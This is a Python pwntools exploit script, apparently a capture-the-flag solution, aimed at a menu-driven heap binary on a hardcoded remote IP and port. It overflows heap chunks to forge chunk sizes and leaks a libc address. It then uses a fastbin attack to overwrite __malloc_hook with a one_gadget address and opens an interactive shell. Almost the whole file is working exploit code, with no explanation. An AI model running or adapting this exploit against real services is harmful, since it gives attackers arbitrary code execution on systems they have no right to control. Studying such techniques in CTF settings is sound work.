#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

DEBUG = True
context.log_level = "debug"
if DEBUG:
	#io = process("./pwn")
	io = remote("106.75.27.104",50514)
	elf = ELF("./pwn")

def change(index,size,content):
	io.sendlineafter("Your choice:","3")
	io.sendlineafter("Please enter the index of servant:",str(index))
	io.sendlineafter("Please enter the length of servant name:",str(size))
	io.sendafter("Please enter the new name of the servnat:",content)

def Add(size,content):
	io.sendlineafter("Your choice:","2")
	io.sendlineafter("Please enter the length of servant name:",str(size))
	io.sendafter("Please enter the name of servant:",content)

def free(index):
	io.sendlineafter("Your choice:","4")
	io.sendlineafter("Please enter the index of servant:",str(index))

def dump():
	io.sendlineafter("Your choice:","1")
	return io.recvline()

def leak():
	#Add(0x16,p64(elf.got["malloc"]))
	#dump()
	Add(0xd0,0xd0*"e")
	Add(0x80,0x80*"e")
	Add(0x20,0x20*"a")
	Add(0x20,0x20*"b")
	Add(0x20,0x20*"c")
	Add(0x20,0x20*"d")
	free(4)
	free(3)
	change(2,0x20+0x10,"a"*0x20+p64(0)+p64(0x31))
	change(0,0xd0+0x10,"a"*0xd0+p64(0)+'\x31')
	
	Add(0x20,0x20*"a")
	Add(0x20,0x20*"a")
	change(0,0xd0+0x10,"a"*0xd0+p64(0)+'\x91')
	free(1)
	leak_addr = u64(dump()[0xd4+0x24+0x24+4:0xd4+0x24+0x24+4+6]+'\x00\x00')
	print hex(leak_addr)
	#Add(0x100,0x100*"a")
	#change(2,0x20,"a"*0x10+p64(0)+p64(0x31))
	#free(1)
	#Add(0x60,0x60*"a")
	#change(1,0x40+0x10,"a"*0x40+p64(0)+p64(0x111))
	#Add(0x50,0x50*"a")
	#free(2)
	#raw_input()
	#change(1,0x40+0x12,"a"*0x40+"a"*0x12)
	offset = 0x7f8cbbde2b78-0x7f8cbba1e000
	log.info("get libc_base:" + hex(leak_addr - offset))
	return leak_addr - offset

def fastbinattack(libc_base):
	malloc_hook = 0x00000000003c4b10 + libc_base
	log.info("malloc_hook @" + hex(malloc_hook))
	Add(0x40,0x40*"a")
	Add(0x60,0x60*"a")#7
	Add(0x60,0x60*"a")#8
	free(7)
	change(6, 0x60 + 0x10 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0))

	Add(0x60,0x60*"a")
    # free_hook
	Add(0x60,"a")
    #		   memalign_hook     realloc_hook      malloc hook
	payload = 3 * 'a' + p64(0)	  + p64(0)	+ p64(libc_base + 0x45216)#0x4526a)
	change(8, len(payload), payload)
	io.sendlineafter("Your choice:","2")
	io.sendafter("Please enter the length of servant name:",str(0x100))
	#free(8)
	#Add(0x40,"a")
#context.terminal=['tmux','splitw','-h']
#gdb.attach(io,"b *0x0000000000400e64")
#raw_input()
#print hex(leak())
#raw_input()
fastbinattack(leak())
#fastbinattack()
io.interactive()
	
